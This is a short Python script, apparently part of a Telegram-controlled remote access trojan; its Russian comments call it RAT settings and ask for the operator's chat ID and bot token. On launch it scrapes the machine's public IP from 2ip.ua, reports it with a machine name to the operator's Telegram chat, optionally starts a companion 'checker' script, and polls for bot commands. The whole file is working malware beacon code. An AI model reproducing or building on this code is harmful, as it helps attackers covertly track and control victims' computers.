import telebot
from telebot import types
import http.client
import configparser
import os
import time
import sys
import bs4, requests
config = configparser.ConfigParser()
config.read("settings.ini")

########################Настройки для РАТ####################################
chat_id=config["telegram"]["chat_id"] #chat_id=ВАШ ЧАТ АЙДИ
token=config["telegram"]["token"] #token=ТОКЕН ВАШЕГО БОТА
#############################################################################

bot = telebot.TeleBot(token);


s = requests.get('https://2ip.ua/ru/')
b = bs4.BeautifulSoup(s.text, "html.parser")
a = b.select(" .ipblockgradient .ip")[0].getText()
if config["local"]["enablechecker"] == "true":
    os.system("python3 cheker.pyw")
    bot.send_message(chat_id, "> " + config["local"]["prefix"] + " " + config["local"]["name"] + ":запущено" + '(' + a + ")" + "\nЧекер включен")
else:
    bot.send_message(chat_id, "> " + config["local"]["prefix"] + " " + config["local"]["name"] + ":запущено" + '(' + a + ")" + "\nЧекер не включен!")
bot.polling()
